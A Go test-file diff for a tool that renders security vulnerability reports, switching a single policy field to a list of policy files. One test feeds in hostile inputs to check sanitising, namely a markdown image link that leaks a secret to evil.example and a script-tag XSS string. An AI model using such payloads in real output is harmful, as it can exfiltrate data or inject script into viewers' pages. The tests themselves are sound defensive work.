@@ -159,7 +159,7 @@ func TestRender(t *testing.T) {
 		Duplicates:       []Duplicate{{GHSAID: "GHSA-real", URL: "https://x/GHSA-real", Confidence: "high", Exact: true}, {GHSAID: "GHSA-near", URL: "https://x/GHSA-near", Confidence: "low", Published: true}},
 		Related:          []Related{{Number: 12, Title: "Harden", URL: "https://x/12", PullRequest: true, Confidence: "medium"}, {Number: 13, Title: "Crash", URL: "https://x/13", Confidence: "low"}},
 		CodeReferences:   []CodeReference{{Path: "a.c", Symbol: "f", Found: true}, {Path: "b|c.c"}},
-		Policy:           "SECURITY.md",
+		Policies:         []string{"SECURITY.md"},
 		PolicyExclusions: []PolicyPoint{{Point: "Malicious unserialize() inputs", Reason: "The PoC feeds unserialize()."}},
 		CWE:              []CWE{{ID: "CWE-787", Reason: "write"}},
 		CVSS:             CVSS{Vector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N", Reason: "remote"},
@@ -196,7 +196,7 @@ func TestRenderNeutralisesMarkup(t *testing.T) {
 		Summary:          "![x](https://evil.example/?d=SECRET) <img src=x> [link](https://evil.example) # Heading",
 		Related:          []Related{{Number: 1, Title: "<script>alert(1)</script>", URL: "https://x/1", Confidence: "low"}},
 		CodeReferences:   []CodeReference{{Path: "a`b.c", Symbol: "f`) [x](y"}},
-		Policy:           "SECURITY.md",
+		Policies:         []string{"SECURITY.md"},
 		PolicyExclusions: []PolicyPoint{{Point: "**bold**", Reason: "@maintainers ping"}},
 		CWE:              []CWE{{ID: "CWE-787", Reason: "~~strike~~ | pipe"}},
 	})
@@ -238,9 +238,9 @@ func TestTextLeavesNoMarkup(t *testing.T) {
 }
 
 func TestRenderPolicyWithoutExclusion(t *testing.T) {
-	got := Render(Report{Policy: ".github/SECURITY.md", PolicyExclusions: nil})
+	got := Render(Report{Policies: []string{".github/SECURITY.md", "AGENTS.md"}})
 
-	if !strings.Contains(got, "Checked against `.github/SECURITY.md`.\n\nNothing in the policy seems to exclude this report.") {
+	if !strings.Contains(got, "Checked against `.github/SECURITY.md`, `AGENTS.md`.\n\nNothing in the policy seems to exclude this report.") {
 		t.Errorf("unexpected policy section:\n%s", got)
 	}
 }
